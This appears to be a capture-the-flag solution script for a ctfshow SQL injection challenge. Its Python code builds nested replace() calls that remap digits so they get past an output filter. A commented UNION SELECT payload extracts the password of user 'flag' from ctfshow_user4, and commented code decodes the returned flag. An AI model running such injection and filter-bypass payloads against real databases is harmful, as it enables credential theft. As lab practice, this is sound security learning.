t='password'
for i in range(10):
    r=chr(ord(str(i))+49)
    s=f"replace({t},'{i}','_{r}_')"
    t=s
print(s)
#payload -1'+union+select+replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'0','_a_'),'1','_b_'),'2','_c_'),'3','_d_'),'4','_e_'),'5','_f_'),'6','_g_'),'7','_h_'),'8','_i_'),'9','_j_'),'aa'+from+ctfshow_user4+where+username='flag'--+
#查询后ctfshow{_e__g_ba_j__a__d__i_-_b_cbb-_e__c_ba-ae_j__f_-de_c__g__g__a_da_e__j__g_e}

# en_s='ctfshow{_e__g_ba_j__a__d__i_-_b_cbb-_e__c_ba-ae_j__f_-de_c__g__g__a_da_e__j__g_e}'
# i=0
# l=len(en_s)
# new=''
# while i<l:
#     if en_s[i]=='_':
#         j=i+3
#         de_s=chr(ord(en_s[i+1])-49)
#         new+=de_s
#         i=j
#     else:
#         new+=en_s[i]
#         i+=1
# print(new)